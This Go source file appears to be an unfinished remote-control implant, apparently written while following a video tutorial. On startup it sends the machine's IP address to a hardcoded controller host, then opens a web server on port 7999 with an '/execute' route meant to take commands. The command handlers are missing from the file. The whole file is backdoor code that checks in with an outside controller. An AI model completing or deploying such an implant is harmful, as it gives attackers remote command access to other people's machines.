package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"io/ioutil"
	"net"
	"net/http"
)

const ReverseIP = "192.168.80.128"

// communication function

func main() {
	SendIP()

	r := gin.Default()
	// todo
	r.GET("/execute", AcceptCmd)
	r.GET("/other", other)
	r.Run(":7999")

}


// send ip to control side
// ref: https://www.bilibili.com/video/BV1yc411Y78e 0:22:35
func SendIP() string {
	ip, err := GetExternalIP()
	if err != nil {
		fmt.Println("Error GetExternalIP(): ", err)
	}

	url := "http://" + ReverseIP + "/user/" + ip
	response, err := http.Get(url)
	if err != nil {
		fmt.Println("HTTP GET url failed: ", err)
		return "HTTP GET url failed"
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)

	if err != nil {
		fmt.Println("read response failed: ", err)
		return "read response failed"
	}

	fmt.Println("HTTP status code: ", response.Status)
	fmt.Println("Response body: ", string(body))

	return "Response body: \r\n" + string(body)
}

func GetExternalIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		fmt.Println("GetExternalIP() failed: ", err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String(), nil

}
